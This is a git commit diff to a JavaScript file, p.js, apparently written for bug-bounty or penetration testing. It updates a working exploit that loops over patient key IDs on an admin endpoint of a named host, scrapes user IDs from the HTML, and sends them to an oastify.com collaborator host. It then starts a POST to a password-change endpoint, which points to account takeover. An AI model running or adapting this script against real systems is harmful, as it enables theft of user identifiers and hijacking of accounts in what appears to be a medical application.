7524bc3935a564f47a084b284f8be7917acbb63d
Yarterss <trey@inspectiv.com>
2025-02-26 11:41:45 -0600

    Update p.js

--- p.js
+++ p.js
@@ -1,10 +1,10 @@
-for (let i = 199300; i <= 199301; i++) {
+for (let i = 199307; i <= 199308; i++) {
   fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
     .then(res => res.text())
     .then(res => {
       let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
       if (match) {
-        fetch(`https://7em99iw0tto3cjnha2ituegsljraf13q.oastify.com?data=${encodeURIComponent(match[1])}`);
+        fetch(`https://z6611aosllgv4bf92ualm68kdbj27uvj.oastify.com?data=${encodeURIComponent(match[1])}`);
       }
       return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
         method: "POST",
